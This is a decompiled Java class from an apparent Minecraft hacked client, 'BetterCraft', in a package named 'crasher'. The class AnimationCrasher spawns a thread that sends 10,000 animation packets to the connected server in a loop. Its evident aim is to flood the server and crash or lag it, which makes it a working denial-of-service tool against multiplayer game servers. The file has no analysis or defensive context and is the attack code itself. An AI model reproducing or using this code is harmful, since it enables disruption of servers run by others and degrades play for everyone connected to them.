/*    */ package me.nzxter.bettercraft.mods.crasher;
/*    */ 
/*    */ import net.minecraft.client.Minecraft;
/*    */ import net.minecraft.network.Packet;
/*    */ import net.minecraft.network.play.client.CPacketAnimation;
/*    */ 
/*    */ public class AnimationCrasher {
/*    */   public static void start() {
/*  9 */     (new Thread()
/*    */       {
/*    */         public void run()
/*    */         {
/* 13 */           for (int i2 = 0; i2 < 10000; i2++) {
/* 14 */             (Minecraft.getMinecraft()).player.connection.sendPacket((Packet)new CPacketAnimation());
/*    */           }
/*    */         }
/* 17 */       }).start();
/*    */   }
/*    */ }


/* Location:              C:\Users\emlin\Desktop\BetterCraft.jar!\me\nzxter\bettercraft\mods\crasher\AnimationCrasher.class
 * Java compiler version: 8 (52.0)
 * JD-Core Version:       1.1.3
 */